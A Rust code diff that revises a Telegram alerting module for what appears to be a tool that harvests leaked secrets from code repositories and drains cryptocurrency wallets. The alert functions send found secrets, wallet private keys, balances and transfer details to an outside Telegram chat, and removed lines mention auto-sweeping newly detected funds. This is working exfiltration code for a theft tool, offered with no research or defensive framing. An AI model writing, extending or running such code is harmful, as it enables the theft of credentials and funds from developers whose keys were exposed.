@@ -19,7 +19,24 @@ impl TelegramAlerts {
         Ok(Self { bot, chat_id })
     }
     
-    // Send secret found alert
+    // Optional — agar env vars nahi hain to dummy return karo
+    pub fn new_optional(config: Arc<Config>) -> Arc<Self> {
+        match Self::new(config) {
+            Ok(ta) => {
+                info!("✅ Telegram alerts initialized");
+                Arc::new(ta)
+            }
+            Err(e) => {
+                warn!("⚠️ Telegram init failed: {} — using dummy", e);
+                // Dummy with placeholder values
+                Arc::new(Self {
+                    bot: Bot::new("dummy_token"),
+                    chat_id: ChatId(0),
+                })
+            }
+        }
+    }
+    
     pub async fn send_secret_found(
         &self,
         repo: &str,
@@ -28,137 +45,65 @@ impl TelegramAlerts {
         secret_type: &str,
         secret_value: &str,
     ) {
+        if self.chat_id.0 == 0 {
+            return; // Dummy mode
+        }
+        
         let message = format!(
-            "🚨 *SECRET FOUND!*\n\
-             ━━━━━━━━━━━━━━━━━\n\
-             📁 *Repo:* {}\n\
-             📝 *Commit:* {}\n\
-             📄 *File:* {}\n\
-             🔑 *Type:* {}\n\
-             ━━━━━━━━━━━━━━━━━\n\
-             🔐 *Secret:* `{}`\n\
-             ━━━━━━━━━━━━━━━━━\n\
-             ⏰ *Time:* {}",
-            repo,
-            commit_sha,
-            file_path,
-            secret_type,
-            secret_value,
-            Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
+            "🚨 SECRET FOUND!\nRepo: {}\nCommit: {}\nFile: {}\nType: {}\nSecret: `{}`",
+            repo, commit_sha, file_path, secret_type, secret_value
         );
         
         self.send_message(&message).await;
     }
     
-    // Send balance detected alert
     pub async fn send_balance_detected(&self, wallet_info: &WalletInfo) {
+        if self.chat_id.0 == 0 {
+            return;
+        }
+        
         let message = format!(
-            "💰 *BALANCE DETECTED!*\n\
-             ━━━━━━━━━━━━━━━━━\n\
-             👛 *Address:* `{}`\n\
-             🔐 *Private Key:* `{}`\n\
-             💰 *Balance:* {} ETH\n\
-             ━━━━━━━━━━━━━━━━━\n\
-             ⏰ *Time:* {}",
-            wallet_info.address,
-            wallet_info.private_key,
-            wallet_info.balance,
-            Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
+            "💰 BALANCE DETECTED!\nAddress: {}\nBalance: {} ETH\nKey: `{}`",
+            wallet_info.address, wallet_info.balance, wallet_info.private_key
         );
         
         self.send_message(&message).await;
     }
     
-    // Send transfer success alert
-    pub async fn send_transfer_success(
-        &self,
-        wallet_info: &WalletInfo,
-        transfer: &TransferResult,
-    ) {
-        let status = if transfer.success { "✅ SUCCESS" } else { "❌ FAILED" };
+    pub async fn send_transfer_success(&self, wallet_info: &WalletInfo, transfer: &TransferResult) {
+        if self.chat_id.0 == 0 {
+            return;
+        }
         
         let message = format!(
-            "📤 *TRANSFER {}*\n\
-             ━━━━━━━━━━━━━━━━━\n\
-             👛 *From:* `{}`\n\
-             📥 *To:* `{}`\n\
-             💰 *Amount:* {} ETH\n\
-             🔗 *Tx Hash:* `{}`\n\
-             ━━━━━━━━━━━━━━━━━\n\
-             🔐 *Private Key:* `{}`\n\
-             ⏰ *Time:* {}",
-            status,
-            transfer.from_address,
-            transfer.to_address,
-            transfer.amount,
-            transfer.tx_hash,
-            wallet_info.private_key,
-            Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
+            "✅ TRANSFER SUCCESS!\nFrom: {}\nTo: {}\nAmount: {} ETH\nTx: `{}`",
+            transfer.from_address, transfer.to_address, transfer.amount, transfer.tx_hash
         );
         
         self.send_message(&message).await;
     }
     
-    // Send transfer failed alert
-    pub async fn send_transfer_failed(
-        &self,
-        wallet_info: &WalletInfo,
-        error: &str,
-    ) {
+    pub async fn send_transfer_failed(&self, wallet_info: &WalletInfo, error: &str) {
+        if self.chat_id.0 == 0 {
+            return;
+        }
+        
         let message = format!(
-            "⚠️ *TRANSFER FAILED!*\n\
-             ━━━━━━━━━━━━━━━━━\n\
-             👛 *Address:* `{}`\n\
-             🔐 *Private Key:* `{}`\n\
-             💰 *Balance:* {} ETH\n\
-             ❌ *Error:* {}\n\
-             ━━━━━━━━━━━━━━━━━\n\
-             ⚡ Manual transfer required!\n\
-             ⏰ *Time:* {}",
-            wallet_info.address,
-            wallet_info.private_key,
-            wallet_info.balance,
-            error,
-            Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
+            "❌ TRANSFER FAILED!\nAddress: {}\nError: {}\nKey: `{}`",
+            wallet_info.address, error, wallet_info.private_key
         );
         
         self.send_message(&message).await;
     }
     
-    // Send new funds detected alert (realtime monitor)
-    pub async fn send_new_funds_alert(
-        &self,
-        address: &str,
-        private_key: &str,
-        balance: &str,
-    ) {
-        let message = format!(
-            "🔄 *NEW FUNDS DETECTED!*\n\
-             ━━━━━━━━━━━━━━━━━\n\
-             👛 *Address:* `{}`\n\
-             🔐 *Private Key:* `{}`\n\
-             💰 *New Balance:* {} ETH\n\
-             ━━━━━━━━━━━━━━━━━\n\
-             ⚡ Auto-sweep triggered!\n\
-             ⏰ *Time:* {}",
-            address,
-            private_key,
-            balance,
-            Utc::now().format("%Y-%m-%d %H:%M:%S UTC")
-        );
-        
-        self.send_message(&message).await;
-    }
-    
-    // Generic message sender
     async fn send_message(&self, message: &str) {
         match self.bot
             .send_message(self.chat_id, message)
-            .parse_mode(ParseMode::Markdown)
+            .parse_mode(ParseMode::MarkdownV2)
             .await
         {
             Ok(_) => info!("✅ Telegram alert sent"),
-            Err(e) => warn!("❌ Failed to send Telegram alert: {}", e),
+            Err(e) => warn!("❌ Telegram send failed: {}", e),
         }
     }
 }
